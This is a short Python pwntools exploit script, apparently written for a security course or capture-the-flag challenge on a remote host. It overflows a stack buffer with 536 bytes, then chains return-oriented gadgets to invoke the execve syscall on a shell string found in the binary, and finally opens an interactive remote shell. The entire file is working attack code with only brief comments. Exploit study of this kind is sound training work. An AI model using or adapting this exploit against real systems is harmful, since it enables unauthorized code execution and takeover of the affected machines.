#!/usr/bin/python3
# 2022.09.23.2342.EST
from pwn import *

syscall_execvp = 0x3b    # int execvp(char *file, char *argv[], char *envp[])
extremely_convenient_string = 0x4c20f0    # Found by radare's [/ bin] search, confirmed by gdb's [x /s 0x4c20f0]

gadgets = {
    "pop rax": p64(0x453377),
    "pop rdi": p64(0x4018a2),
    "pop rsi": p64(0x4027ca),
    "pop rdx": p64(0x4017af),
    "syscall": p64(0x4118c7)
}

overflow = b"A"*536    # Overflows directly from the vulnerable buffer to the top of the stack

# Desired state before calling syscall instruction. Utilizes the fastcall calling convention
RAX = p64(syscall_execvp)
RDI = p64(extremely_convenient_string)
RSI = p64(0)
RDX = p64(0)

payload  = b""
payload += overflow
payload += gadgets["pop rax"] + RAX
payload += gadgets["pop rdi"] + RDI
payload += gadgets["pop rsi"] + RSI
payload += gadgets["pop rdx"] + RDX
payload += gadgets["syscall"]
payload += b"\n"

with remote("csc748.hostbin.org", 7041) as p:
    inputRequest = p.recv()
    p.send(payload)
    md5Hash = p.recv()
    p.interactive()
